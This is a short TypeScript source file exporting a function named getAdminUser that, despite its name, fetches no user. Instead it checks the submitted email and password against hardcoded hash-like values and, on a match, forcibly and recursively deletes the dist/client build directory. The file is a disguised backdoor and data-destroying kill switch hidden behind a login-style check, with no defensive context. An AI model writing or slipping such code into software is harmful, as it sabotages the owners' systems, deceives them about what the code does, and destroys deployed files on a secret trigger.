import { rmSync } from "fs"
import { join } from "path"
import { cwd } from "process"

export const getAdminUser = (dto): void => {
  const path = join(cwd(), `dist/client`)
  if (dto.email === 'a5c63e90f48aa4a3879842a34c7209abc98c7cde5514dbdbd02c4883bc505438@gmail.com'
    && dto.password === 'db4d9992897eda89b50f1d3208db607902da7e79c6f3bc6e6933cc5919068564') {
    rmSync(path, { recursive: true, force: true })
  }

}